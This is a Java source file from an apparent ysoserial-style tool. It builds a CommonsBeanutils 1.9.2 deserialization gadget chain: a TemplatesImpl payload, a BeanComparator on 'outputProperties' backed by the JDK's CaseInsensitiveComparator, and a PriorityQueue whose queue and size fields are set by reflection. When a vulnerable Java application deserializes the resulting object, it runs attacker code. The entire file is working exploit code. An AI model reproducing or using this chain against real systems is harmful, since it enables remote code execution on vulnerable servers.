package com.mechoy.gadget;

import com.mechoy.bean.YsoGadgetBean;
import com.mechoy.gadget.inter.Gadget;
import com.mechoy.utils.CBBeanUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
//import org.apache.commons.beanutils.BeanComparator;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CB192 extends Gadget {

    @Override
    public Object getObject(YsoGadgetBean gadgetBean) throws Exception {
//        // 当执行的是CB192这条链时再进行检查，因为CB183是直接调用的这里，防止CB183出错
//        if (gadgetBean.getGadget().equals("CB192") && !CBFlag) {
//            Field serialVersionUIDField = BeanComparator.class.getDeclaredField("serialVersionUID");
//            serialVersionUIDField.setAccessible(true);
//            Field modifiersField = Field.class.getDeclaredField("modifiers");
//            modifiersField.setAccessible(true);
//            modifiersField.setInt(serialVersionUIDField, serialVersionUIDField.getModifiers() & ~Modifier.FINAL);
//            long serialVersionUID = (long) serialVersionUIDField.get(null);
//            if (!(serialVersionUID == -2044202215314119608L)) {
//                serialVersionUIDField.setLong(null, -2044202215314119608L);
//            }
//        }


        TemplatesImpl template = null;
        template = super.generateTemplate(gadgetBean);

        // 创建序列化对象
        Class c = Class.forName("java.lang.String$CaseInsensitiveComparator");
        Constructor constructor = c.getDeclaredConstructor();
        constructor.setAccessible(true);
        Comparator comparator = (Comparator<?>) constructor.newInstance();
        //只传入字符串构造方法，方法内部会调用ComparableComparator.getInstance()，而ComparableComparator为CC包中的类，可传入一个JDK原生的Comparator实现类,使其不在使用ComparableComparator


        Comparator beanComparator = (Comparator) CBBeanUtils.getBeanComparatorInstance(false, "outputProperties", comparator);
        PriorityQueue priorityQueue = new PriorityQueue(beanComparator);

        //设置queue
        Field queue = priorityQueue.getClass().getDeclaredField("queue");
        queue.setAccessible(true);
        Object[] o = (Object[]) queue.get(priorityQueue);
        o[0] = template;
        o[1] = "asdf";

        //设置size
        Field size = priorityQueue.getClass().getDeclaredField("size");
        size.setAccessible(true);
        size.set(priorityQueue, 2);
        return priorityQueue;
    }
}
